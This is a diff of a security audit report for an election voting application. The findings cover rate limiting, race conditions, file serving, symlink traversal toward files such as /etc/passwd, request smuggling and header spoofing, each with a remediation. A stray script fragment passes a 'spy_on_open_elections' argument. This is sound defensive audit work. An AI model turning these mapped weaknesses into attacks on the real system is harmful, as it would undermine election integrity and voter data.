-The application contains several instances of "dangerous functionality" as defined by ASVS (deserialization, dynamic code execution, raw data parsing, direct memory manipulation) that are not documented with their risks and mitigations: (1) Deserialization of data (json.loads) in json2kv function - While JSON is safer than pickle/yaml, it still processes structured data from database storage. (2) Low-level cryptographic operations (argon2.low_level) - Direct use of low_level API bypasses safety checks of the high-level argon2 API. (3) Symmetric encryption/decryption with key material handling - create_vote and decrypt_votestring functions handle sensitive key material. (4) Dynamic module imports - pages and api modules are imported dynamically. (5) HKDF key derivation with hardcoded info parameter - The info parameter references XChaCha20 but the derived key is used for Fernet, which could confuse auditors or lead to incorrect cryptographic assumptions. Without documentation, developers and auditors cannot quickly identify: where the most security-sensitive code resides, what additional review/testing these areas require, what the acceptable input constraints are for dangerous operations, and what the blast radius is if a vulnerability is found in these areas.
-
-**Remediation:**
-
-Create docs/DANGEROUS_FUNCTIONALITY.md documenting: ## Cryptographic Key Derivation (crypto.py) - Type: Direct memory manipulation (Argon2 low-level), key material handling - Location: v3/steve/crypto.py:_hash(), _b64_vote_key(), gen_opened_key() - Risk: Incorrect parameters could weaken vote encryption - Mitigation: Parameters benchmarked, unit tested, review required for changes - Input Trust: All inputs are system-generated (salts, tokens) — not user-controlled. ## Vote Encryption/Decryption (crypto.py) - Type: Symmetric encryption with derived keys - Location: v3/steve/crypto.py:create_vote(), decrypt_votestring() - Risk: Key leakage exposes all votes for an election - Mitigation: Keys derived per-voter-per-issue, never stored in plaintext. ## Data Deserialization (election.py) - Type: JSON deserialization - Location: v3/steve/election.py:json2kv() - Risk: Low (JSON parser, data sourced from database) - Mitigation: Data written by application's own kv2json(); no untrusted input. ## Dynamic Module Loading (main.py) - Type: Dynamic imports at startup - Location: v3/server/main.py:create_app() - Risk: Module injection if filesystem compromised - Mitigation: Imports are hardcoded module names, not user-controlled strings.
-
----
-
-#### FINDING-209: Repeated Argon2 Calls in has_voted_upon() Without Throttling
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.2 |
-| **Files** | v3/steve/election.py:307-333 |
-| **Source Reports** | 15.2.2.md |
-| **Related Findings** | None | **Description:**
-
-The has_voted_upon() function is callable by any authenticated voter and triggers Argon2 computation for each issue in an election without throttling. An election with many issues (e.g., 50+ candidates as individual issues) would require 50+ Argon2 computations per page load, consuming ~3.2GB+ of memory throughput per request. This creates a resource consumption vector proportional to election size that can be triggered by any authenticated user.
-
-**Remediation:**
-
-Implement per-user rate limiting and cap the number of concurrent Argon2 operations system-wide to prevent resource exhaustion from repeated calls to this endpoint.
-
----
-
-#### FINDING-210: No Visible Rate Limiting or Request Timeout Configuration
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.2 |
-| **Files** | v3/server/main.py |
-| **Source Reports** | 15.2.2.md |
-| **Related Findings** | None | **Description:**
-
-The application has no visible rate limiting at the application layer and no evidence of middleware or framework-level controls for request throttling or timeouts. Without these controls, unlimited HTTP requests can trigger resource-intensive operations (Argon2, database) with no backpressure mechanism. The application relies entirely on external infrastructure (reverse proxy) for DoS protection, which is undocumented and may not be implemented in all deployment environments.
-
-**Remediation:**
-
-Implement application-level rate limiting using quart_rate_limiter with default limits (e.g., 50 requests per minute). Add request timeout configuration and document deployment requirements for external DoS protection infrastructure.
-
----
-
-#### FINDING-211: Benchmarking Function Included in Production Crypto Module
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.3 |
-| **Files** | v3/steve/crypto.py:125-158 |
-| **Source Reports** | 15.2.3.md |
-| **Related Findings** | None | **Description:**
-
-While not directly exploitable via HTTP (requires __main__ execution or explicit import), this function: 1. Exists in the production deployment, increasing attack surface 2. Uses a hardcoded salt (b'16_byte_salt_123') which could mislead developers 3. Imports time module solely for this function 4. Uses Argon2.Type.ID while production uses Type.D, potentially confusing security audits 5. Contains informational output via print() rather than logging
-
-**Remediation:**
-
-Move benchmark_argon2() to a separate development/testing module not included in production deployments: Move to: v3/tools/benchmark_argon2.py (excluded from production)
-
----
-
-#### FINDING-212: easydict Package Used Without Verification — Low-Maintenance Dependency
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.4 |
-| **Files** | v3/steve/election.py:25 |
-| **Source Reports** | 15.2.4.md |
-| **Related Findings** | None | **Description:**
-
-easydict is a convenience package with minimal maintenance activity. It's used throughout election.py for dictionary attribute access. Being a low-download, simple utility package, it's a higher-risk target for supply chain attacks (typosquatting, maintainer account takeover). The domain context notes that ezt is "not widely used" as a risk factor — the same applies to easydict.
-
-**Remediation:**
-
-Consider replacing with Python's built-in types.SimpleNamespace or dataclasses, eliminating the third-party dependency entirely: from types import SimpleNamespace # Replace edict(...) with SimpleNamespace(...)
-
----
-
-#### FINDING-213: No Architectural Isolation Between Administrative and User-Facing Operations
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.5 |
-| **Files** | v3/server/main.py, v3/steve/election.py |
-| **Source Reports** | 15.2.5.md |
-| **Related Findings** | None | **Description:**
-
-Administrative operations (election deletion, tallying with decryption, opening/closing elections) execute in the same process space as user-facing operations. A vulnerability in a user-facing endpoint could be leveraged to access administrative functionality. There is no evidence of: Separate admin service/process, Network-level isolation between admin and voter paths, Container boundaries between operations, Privilege separation at the OS level.
-
-**Remediation:**
-
-Option 1: Separate admin into its own service (admin_service/main.py - runs on different port/network). Option 2: Containerization with network policies using docker-compose.yml with voter-app on frontend network and admin-app on backend network not accessible from internet.
-
----
-
-#### FINDING-214: Cryptographic Operations Execute Without Sandboxing or Memory Isolation
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.2.5 |
-| **Files** | v3/steve/crypto.py:88-99 |
-| **Source Reports** | 15.2.5.md |
-| **Related Findings** | None | **Description:**
-
-The argon2.low_level API directly calls into a C library (argon2-cffi-bindings wrapping the reference C implementation). This: 1. Allocates 64MB of memory per call within the application process, 2. Executes native code that could be exploited if the argon2-cffi-bindings library has a memory corruption vulnerability, 3. Shares the same memory space as all application data (encryption keys, vote content). A memory corruption vulnerability in the native Argon2 library could expose the opened_key or vote tokens stored in the same process memory.
-
-**Remediation:**
-
-Run crypto operations in a sandboxed subprocess using subprocess.run with resource limits via ulimit or seccomp. Alternatively, deploy with container-level memory limits and seccomp profiles to contain potential native code exploitation.
-
----
-
-#### FINDING-215: Raw Database Rows Returned Without Python-Level Field Filtering
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.3.1 |
-| **Files** | v3/steve/election.py:374, v3/steve/election.py:399 |
-| **Source Reports** | 15.3.1.md |
-| **Related Findings** | None | **Description:**
-
-The methods `open_to_pid()` and `upcoming_to_pid()` in `election.py` return raw database rows without explicit Python-level field filtering. If the underlying SQL queries select from the metadata table without column restrictions, sensitive fields (`salt`, `opened_key`) could leak to templates and eventually to client-side HTML. This is inconsistent with the control pattern used in `owned_elections()`, which explicitly excludes sensitive columns with a comment acknowledging the need to prevent exposure of `salt` and `opened_key`. The severity is mitigated if the queries in `queries.yaml` select only specific columns, but this cannot be verified from the provided code.
-
-**Remediation:**
-
-Apply explicit Python-level field filtering to `open_to_pid()` and `upcoming_to_pid()` methods, matching the pattern used in `get_metadata()` and `owned_elections()`. Return only safe fields by constructing explicit `edict` objects with allowed fields (eid, title, owner_pid, closed, open_at, close_at, issue_count) rather than passing through raw database rows.
-
----
-
-#### FINDING-216: Election Creation Accepts Unrestricted Form Data Pattern
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.3.3 |
-| **Files** | v3/server/pages.py:439 |
-| **Source Reports** | 15.3.3.md |
-| **Related Findings** | None | **Description:**
-
-The do_create_endpoint() function loads ALL form data into an edict without a whitelist, creating risk of future mass assignment. While currently only form.title is passed to Election.create(), the pattern lacks an explicit allowlist meaning code review is the only protection. The create() method accepts additional parameters (authz, open_at, close_at) that could be exploited if a developer later extracts them from the form. If authz were controllable, an attacker could modify LDAP group authorization for elections they create. If open_at/close_at were controllable, dates could be manipulated.
-
-**Remediation:**
-
-Replace the edict pattern with explicit field extraction using form.get('title', '').strip(). Add validation to ensure title is not empty. Only accept whitelisted fields and perform type checking before passing to Election.create().
-
----
-
-#### FINDING-217: Incomplete Exception Handling for Type Errors in Date Parsing
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.3.5 |
-| **Files** | v3/server/pages.py:91 |
-| **Source Reports** | 15.3.5.md |
-| **Related Findings** | None | **Description:**
-
-The `data.get('date')` could return any JSON type (array, object, number, boolean). The `if not date_str` check would pass for non-empty arrays/objects (truthy values). When passed to `datetime.datetime.fromisoformat()`, a non-string type raises `TypeError`, not `ValueError`. Only `ValueError` is caught. This results in unhandled 500 error instead of a clean 400 response, potentially causing information leakage via stack traces if debug mode is enabled.
-
-**Remediation:**
-
-Add explicit type validation using `isinstance(date_str, str)` before the truthy check. Catch both `ValueError` and `TypeError` in the exception handler. Example:
-```python
-async def _set_election_date(election, field):
-    data = await quart.request.get_json()
-    date_str = data.get('date')
-    if not isinstance(date_str, str) or not date_str:
-        quart.abort(400, 'Missing or invalid date')
-
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
     try:
-        dt = datetime.datetime.fromisoformat(date_str).date()
-    except (ValueError, TypeError):
-        quart.abort(400, 'Invalid date format')
-```
+        # ... argument parsing and main() call ...
+        main(args.spy_on_open_elections, args.election_id, args.issue_id, args.db_path, args.output)
+    except KeyboardInterrupt:
+        sys.exit(130)
+    except Exception as e:
+        _LOGGER.critical(f'Fatal error: {e}', exc_info=True)
+        sys.exit(2)
 
 ---
 
-#### FINDING-218: Database Connections Created Per-Instance Without Connection Lifecycle Management or Pool Safety
+#### FINDING-202: No evidence of header trust boundary enforcement for intermediary headers
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.4.1 |
-| **Files** | v3/steve/election.py |
-| **Source Reports** | 15.4.1.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 4.1.3 |
+| Files | v3/server/api.py:1-21 |
+| Source Reports | 4.1.3.md |
+| Related Findings | - |
 
-Each concurrent request creates a new Election instance which opens a new asfpy.db.DB connection to the same SQLite file through Election.__init__() and open_database(). There is no connection pooling, no maximum connection limit, and no timeout configuration. Under high concurrency (e.g., many voters submitting simultaneously during election close), this could exhaust file descriptors or cause SQLite SQLITE_BUSY errors without proper retry logic.
+**Description:**
+
+The file imports and exposes `APP` from `asfquart` without any visible configuration to strip or reject user-supplied intermediary headers (e.g., `X-Forwarded-For`, `X-Real-IP`, `X-User-ID`). While the `asfquart` framework may handle this internally, there is no visible control in the auditable codebase to confirm that end-users cannot inject headers that would be trusted as if set by intermediaries. Data flow: External HTTP request → `X-Forwarded-For` header → `APP` request handling → potential trust of user-supplied value as intermediary-set value. If `asfquart` or downstream handlers trust these headers without validation, an attacker could spoof their IP address or identity for access control bypass or audit log pollution.
 
 **Remediation:**
 
-Implement connection pooling with bounded concurrency using an asyncio.Semaphore to limit simultaneous database connections (e.g., max 10 concurrent connections). Create a managed ElectionDB class with a class-level semaphore that controls access to database connections, providing fair queuing and preventing file descriptor exhaustion.
+Configure the application or its framework to explicitly define trusted proxy sources and strip/ignore intermediary headers from untrusted origins. Example: Configure trusted proxies using APP.config['FORWARDED_ALLOW_IPS'] = '127.0.0.1,10.0.0.0/8' or use middleware to strip untrusted headers. Verify that `asfquart` or the reverse proxy configuration strips/overwrites `X-Forwarded-*` and similar headers from untrusted sources.
 
 ---
 
-#### FINDING-219: Non-Atomic State Check and Close Operation
+#### FINDING-203: No visible HTTP message boundary validation or Transfer-Encoding/Content-Length conflict handling
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | CWE-367 |
-| **ASVS Sections** | 15.4.2 |
-| **Files** | v3/steve/election.py:111-116 |
-| **Source Reports** | 15.4.2.md |
-| **Related Findings** | FINDING-074, FINDING-220 | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 4.2.1 |
+| Files | v3/server/api.py:1-21 |
+| Source Reports | 4.2.1.md |
+| Related Findings | - |
 
-The close() method performs a non-atomic check-then-use operation where it first checks if the election is open (is_open()) and then closes it (c_close.perform()). Between these operations, a concurrent close could execute. While double-close is less severe than double-open since closing is idempotent at the database level (setting closed=1 twice has the same effect), it still represents a TOCTOU pattern that could produce misleading log entries or confusing user feedback.
+**Description:**
+
+The file provides no configuration related to HTTP/1.1 request smuggling prevention. There is no visible: rejection of requests with both Transfer-Encoding and Content-Length headers, HTTP/2 DATA frame length validation against Content-Length, or configuration ensuring the application server and reverse proxy agree on message boundaries. If the reverse proxy and Quart/Hypercorn disagree on how to parse the request boundary (e.g., one uses Content-Length while the other uses Transfer-Encoding), an attacker could smuggle a second request that bypasses authentication or access controls.
 
 **Remediation:**
 
-Wrap the close() operation in a BEGIN IMMEDIATE transaction with state re-verification. Re-check the election state within the transaction to ensure it is still open before performing the close operation. Include proper exception handling with ROLLBACK on error and COMMIT on success.
+1. Configure the reverse proxy to normalize requests (reject ambiguous requests with both TE and CL). 2. Configure the ASGI server (Hypercorn) to reject malformed requests. 3. Add application-level validation using a before_request handler to reject requests with both Transfer-Encoding and Content-Length headers by returning a 400 error.
 
 ---
 
-#### FINDING-220: TOCTOU Between Authorization Check and File Serving
+#### FINDING-204: Missing File Handling Documentation
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | CWE-367 |
-| **ASVS Sections** | 15.4.2 |
-| **Files** | v3/server/pages.py:585-599 |
-| **Source Reports** | 15.4.2.md |
-| **Related Findings** | FINDING-074, FINDING-219 | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 5.1.1 |
+| Files | v3/server/pages.py:560-574, v3/docs/schema.md |
+| Source Reports | 5.1.1.md |
+| Related Findings | - |
 
-The serve_doc() endpoint performs a non-atomic authorization check followed by file serving. It first checks if the user has permission by querying q_get_mayvote.first_row(result.uid, iid), then serves the file using send_from_directory(). Between the check and use, the mayvote entry could be deleted (e.g., if the election is reset), allowing a file to be served to a user whose permission was just revoked. While the window is small and the consequence is limited, this is a textbook TOCTOU pattern.
+**Description:**
+
+The application serves documents from `DOCSDIR/<iid>/` via the `/docs/<iid>/<docname>` endpoint, and issue descriptions can reference documents via `doc:filename` syntax (processed by `rewrite_description`). However, there is no documentation anywhere in the provided codebase that defines: Permitted file types for documents associated with issues, Expected file extensions, Maximum file size (or maximum unpacked size), How the application handles malicious files detected during download/processing. Without documented policies on accepted file types, extensions, and sizes, developers cannot implement consistent file validation. End users downloading served documents have no assurance that files have been vetted for malware or unsafe content (e.g., polyglot files, malicious macros).
 
 **Remediation:**
 
-Perform the authorization check and file serving within a transaction, or re-verify the authorization immediately before serving the file. Consider caching the authorization decision with a short TTL, or restructuring the code to minimize the time window between check and use.
+Create explicit documentation specifying: Permitted File Types for Issue Documents (PDF, plain text, PNG images with MIME types), Maximum File Size (Individual file: 10 MB, Per-issue total: 50 MB), Malicious File Handling (Files are scanned with ClamAV on upload, Files failing validation are rejected with HTTP 415 and logged, Served files include Content-Disposition: attachment header, X-Content-Type-Options: nosniff is set on all responses). Implement file extension allowlist in serve_doc, add security headers (X-Content-Type-Options: nosniff and Content-Disposition: attachment), add symlink check before serving files, implement documented file upload handler with MAX_CONTENT_LENGTH, extension validation, magic bytes verification, and maximum file size enforcement.
 
 ---
 
-#### FINDING-221: Transaction Blocks Lack Error Handling — No ROLLBACK on Failure
+#### FINDING-205: Missing compressed file validation against size and count limits
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.4.3 |
-| **Files** | v3/steve/election.py:56-67, v3/steve/election.py:118-135 |
-| **Source Reports** | 15.4.3.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 5.2.3 |
+| Files | v3/server/pages.py:entire application scope |
+| Source Reports | 5.2.3.md |
+| Related Findings | - |
 
-If any operation within the transaction raises an exception, the transaction remains open (not committed, not rolled back). The SQLite connection would hold a write lock until the connection is garbage-collected or explicitly closed. In a concurrent environment, this could deadlock other database operations waiting for the write lock.
+**Description:**
+
+The application has a document serving mechanism (`/docs/<iid>/<docname>`) but no visible handling or validation of compressed files (zip, gz, docx, odt, etc.). There is no code that: 1. Detects if a served or uploaded file is a compressed archive 2. Checks the maximum uncompressed size before extraction 3. Limits the maximum number of files within an archive 4. Prevents zip bomb attacks. Since the upload mechanism is not shown in the provided code, it is impossible to verify that compressed file protections exist upstream. If compressed files (e.g., zip bombs) are placed in `DOCSDIR` through any mechanism, they could be served to users or potentially processed server-side without decompression limits, leading to denial of service.
 
 **Remediation:**
 
-Add try/except/ROLLBACK blocks to all transaction code. Wrap transaction operations in try blocks, catch exceptions, execute ROLLBACK, and re-raise the exception to ensure locks are properly released on failure.
+Implement compressed file validation using a function that checks: 1. Whether the file is a compressed archive (using zipfile.is_zipfile or similar) 2. Total uncompressed size against MAX_UNCOMPRESSED_SIZE (e.g., 100 MB) 3. Number of files in archive against MAX_FILES_IN_ARCHIVE (e.g., 100) 4. Compression ratio to detect zip bombs (reject if ratio > 100). Example implementation provided in report includes validation function that raises ValueError for violations.
 
 ---
 
-#### FINDING-222: No SQLite Busy Timeout Configuration — Concurrent Requests Can Fail Immediately
+#### FINDING-206: No per-user file quota or maximum file count enforcement
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.4.4 |
-| **Files** | v3/steve/election.py:40 |
-| **Source Reports** | 15.4.4.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 5.2.4 |
+| Files | v3/server/pages.py, v3/schema.sql |
+| Source Reports | 5.2.4.md |
+| Related Findings | - |
 
-Concurrent requests → multiple open_database() calls → multiple SQLite connections → no busy_timeout set → SQLITE_BUSY error returned immediately to lower-priority threads. When multiple concurrent requests contend for the SQLite write lock, requests that cannot immediately acquire the lock receive an SQLITE_BUSY error without retrying. This effectively starves lower-priority requests (those that arrive slightly later) by failing them immediately rather than allowing them to wait a reasonable time. SQLite's default busy timeout is 0 (fail immediately), which causes thread starvation under any write contention.
+**Description:**
+
+There is no per-user file quota or maximum file count enforcement anywhere in the provided code or database schema. The database schema (v3/schema.sql) contains tables for elections, issues, persons, mayvotes, and votes — but nothing tracking file storage per user. Documents are served from DOCSDIR/&lt;iid&gt;/ but there is no: 1. Database table or column tracking per-user storage consumption 2. Check limiting the total number of files a user can upload 3. Check limiting total storage bytes per user 4. Any quota enforcement mechanism. A single user (or compromised account) could fill available storage by uploading an unlimited number of files or excessively large files, causing denial of service for all users.
 
 **Remediation:**
 
-Configure SQLite busy timeout in open_database(): db.conn.execute('PRAGMA busy_timeout = 5000') to allow waiting up to 5 seconds for locks to clear.
+Add file tracking table to database schema:
+CREATE TABLE user_files (
+    file_id  TEXT PRIMARY KEY NOT NULL,
+    pid  TEXT NOT NULL,
+    iid  TEXT NOT NULL,
+    filename  TEXT NOT NULL,
+    file_size  INTEGER NOT NULL,
+    uploaded_at  INTEGER NOT NULL,
+    FOREIGN KEY (pid) REFERENCES person(pid),
+    FOREIGN KEY (iid) REFERENCES issue(iid)
+) STRICT;
+
+Implement quota checking function:
+MAX_FILES_PER_USER = 50
+MAX_STORAGE_PER_USER = 500 * 1024 * 1024  # 500 MB
+
+async def check_user_quota(pid):
+    db = steve.election.Election.open_database(DB_FNAME)
+    file_count = db.q_user_file_count.first_row(pid)
+    if file_count and file_count.count >= MAX_FILES_PER_USER:
+        return False, 'Maximum number of files reached'
+    total_size = db.q_user_total_storage.first_row(pid)
+    if total_size and total_size.total >= MAX_STORAGE_PER_USER:
+        return False, 'Storage quota exceeded'
+    return True, None
 
 ---
 
-#### FINDING-223: Unbounded Iteration Over User-Supplied Form Keys Without Limiting Candidate Count
+#### FINDING-207: No Symlink Detection or Prevention in Compressed Files
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.4.4 |
-| **Files** | v3/server/pages.py:399-420 |
-| **Source Reports** | 15.4.4.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 5.2.5 |
+| Files | v3/server/pages.py:entire application scope |
+| Source Reports | 5.2.5.md |
+| Related Findings | - |
 
-User-controlled form data (potentially thousands of vote-xxx keys) → iteration → add_vote() call per key → database query + crypto operations per iteration → CPU/IO exhaustion. A single authenticated request with many fabricated vote- parameters forces the server to iterate through all of them. While invalid IIDs are caught early, the iteration itself and the issue_dict lookups consume resources proportional to attacker input size.
+**Description:**
+
+There is no handling of compressed files visible in the provided code, and consequently no symlink detection or prevention. If documents placed in DOCSDIR originated from extracted archives, symbolic links within those archives could allow access to sensitive files outside the intended directory. While send_from_directory provides some protection against traversal, symlinks resolved at the filesystem level could bypass this. If an attacker can place a compressed file containing symlinks (e.g., pointing to /etc/passwd or the database file) and it gets extracted into DOCSDIR, the serve_doc endpoint could serve sensitive system files to authorized users.
 
 **Remediation:**
 
-Implement a maximum vote count per request (e.g., MAX_VOTES_PER_REQUEST = 100). Check len(votes) during iteration and return an error if the limit is exceeded before processing further.
+Implement symlink validation for compressed files using the provided validate_no_symlinks and safe_extract functions. Add symlink checking before serving files with filepath.is_symlink() check in serve_doc. Mount DOCSDIR filesystem with nosymfollow or equivalent to prevent symlink resolution at the OS level. Example code provided includes zipfile validation to detect symlinks in external_attr and prevent path traversal during extraction.
 
 ---
 
-#### FINDING-224: No documented rate limiting, anti-automation, or adaptive response controls for authentication endpoints
+#### FINDING-208: Missing RFC 6266 Content-Disposition encoding in file serving endpoint
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 6.1.1 |
-| **Files** | v3/server/main.py:34-39, v3/server/pages.py |
-| **Source Reports** | 6.1.1.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 5.4.2 |
+| Files | v3/server/pages.py:560-574 |
+| Source Reports | 5.4.2.md |
+| Related Findings | - |
 
-The application delegates authentication to ASF OAuth (oauth.apache.org). However, there is no documentation anywhere in the provided code (comments, docstrings, or configuration) that describes: 1. How rate limiting is configured for the OAuth callback endpoint 2. Whether the upstream ASF OAuth provider implements anti-automation controls 3. What adaptive response mechanisms exist (e.g., progressive delays, CAPTCHA escalation) 4. How the system prevents malicious account lockout at the ASF OAuth layer 5. Whether the application itself implements any secondary rate limiting on session-protected endpoints. The asfquart.auth.require decorator is used extensively across endpoints (with {R.committer}, {R.pmc_member}, or bare), but no per-endpoint rate limiting is applied. Without documented rate limiting controls, there is no assurance that brute force or credential stuffing attacks against the OAuth flow are mitigated. Operational staff cannot verify correct configuration without documentation.
+**Description:**
+
+The `serve_doc()` endpoint serves files without explicitly setting a properly-encoded `Content-Disposition` header per RFC 6266. The user-controlled `docname` parameter is not sanitized before being reflected in the response. If the filename on disk contains non-ASCII characters or special characters, the response header may not be properly encoded. Data flow: User-controlled `docname` → no sanitization → `send_from_directory()` → response headers potentially reflecting unsanitized filename. If filenames in the docs directory contain special characters (quotes, newlines, non-ASCII), the response headers may be malformed, potentially enabling: 1. Header injection via CRLF sequences in filename 2. Content-Disposition header parsing issues in browsers 3. Filename display issues or spoofing in download dialogs
 
 **Remediation:**
 
-Create authentication security documentation that specifies: 1. Rate Limiting - OAuth callback endpoint: Delegated to ASF OAuth (oauth.apache.org) with specific controls described, Application-level max attempts per IP per minute via reverse proxy. 2. Anti-Automation - CAPTCHA integration and bot detection mechanisms. 3. Adaptive Response - Behavior after N failed attempts, account lockout prevention with unlock mechanism for ASF accounts. 4. Reverse Proxy Configuration - Apache/nginx rate limit rules with reference to config files.
+Sanitize the filename using secure_filename() and explicitly set Content-Disposition with properly encoded filenames. Use as_attachment=True and attachment_filename parameters in send_from_directory(). Add an explicit allowlist regex for docname validation. Set X-Content-Type-Options: nosniff header.
 
 ---
 
-#### FINDING-225: Multiple authentication pathways exist but are not documented together with security controls
+#### FINDING-209: No Antivirus Scanning for Documents Served to Users
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 6.1.3 |
-| **Files** | v3/server/pages.py:multiple locations |
-| **Source Reports** | 6.1.3.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 5.4.3 |
+| Files | v3/server/pages.py:598-614, v3/server/pages.py:50-57 |
+| Source Reports | 5.4.3.md |
+| Related Findings | - |
 
-The application implements at least three distinct authentication/authorization pathways: 1) Bare session (@asfquart.auth.require) for endpoints like /profile, /settings, /docs/&lt;iid&gt;/&lt;docname&gt;; 2) Committer level (@asfquart.auth.require({R.committer})) for /voter, /admin, /manage/&lt;eid&gt;, and all voting and issue management endpoints; 3) PMC member level (@asfquart.auth.require({R.pmc_member})) for /do-create-election. Additionally, the '### need general solution' comments throughout indicate that the authorization model is incomplete and evolving. There is no documentation that defines what security controls apply at each level, describes the authentication strength at each level (all use the same OAuth flow), explains why certain endpoints use one level vs another, or documents the planned 'general solution' mentioned in comments. The repeated '### check authz' comments indicate that fine-grained authorization checks are acknowledged as needed but not implemented.
+**Description:**
+
+Files placed in the `docs` directory are served directly to authenticated users without malware scanning. While the code does not show an explicit upload mechanism, the infrastructure for serving per-issue documents exists, and the application converts `doc:filename` patterns in issue descriptions into download links, indicating files are expected to be present and served to users. Files placed in the `docs` directory (whether by admin CLI scripts, manual upload, or an upload mechanism not shown in these files) are served directly to authenticated users without malware scanning. A malicious document (e.g., a PDF with embedded exploit, a malware-laden Office document, or an HTML file with scripts) placed in the docs directory would be served to all voters authorized for that issue. Given the election context, a compromised admin or supply-chain attack on candidate documents could distribute malware to all eligible voters with potential for widespread compromise of voter systems in a targeted attack scenario.
 
 **Remediation:**
 
-Create comprehensive authentication pathways documentation that includes: 1) OAuth Flow documentation covering provider (ASF OAuth), authentication strength (single-factor ASF credentials), session management, and security controls; 2) Authorization Levels documentation for Level 0 (Public/No Authentication), Level 1 (Authenticated User with valid session), Level 2 (ASF Committer with committer status), and Level 3 (PMC Member); 3) Consistency Enforcement documentation explaining that all pathways use the same ASF OAuth provider with identical authentication strength, with authorization differing by LDAP group membership. Document the current state including acknowledged gaps (fine-grained authorization checks) and planned remediation. Store this documentation in a central location such as docs/AUTHENTICATION.md.
+Implement antivirus scanning using ClamAV/clamdscan either at serving time or at ingestion time. Option 1: Scan at serving time by adding a scan_file() async function that runs clamdscan before send_from_directory, with fail-closed behavior if scanner is unavailable. Validate filename extensions against an allowed whitelist (e.g., .pdf, .txt, .md, .html). Option 2: Scan at ingestion time by implementing a place_document() function that scans files before copying them to the DOCSDIR. Both options should include proper logging and error handling with fail-closed security posture.
 
 ---
 
-#### FINDING-226: No Visible Token Signature Validation in Application Code
+#### FINDING-210: No Visible Token Signature Validation in Application Code
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 9.1.1 |
-| **Files** | v3/server/pages.py:75-106, v3/server/main.py:27-42 |
-| **Source Reports** | 9.1.1.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 9.1.1 |
+| Files | v3/server/pages.py:75-106, v3/server/main.py:27-42 |
+| Source Reports | 9.1.1.md |
+| Related Findings | - |
 
-Token/session validation is entirely delegated to the `asfquart` framework. The application code contains zero explicit signature validation, and no configuration parameters for signature verification keys are provided. If `asfquart` fails to validate, the application has no defense-in-depth. The application's trust model assumes `asfquart.session.read()` returns fully validated, trustworthy data. Every endpoint reads session data and uses `uid` directly for authorization decisions (database queries, ownership checks, logging) without any additional verification layer.
+**Description:**
+
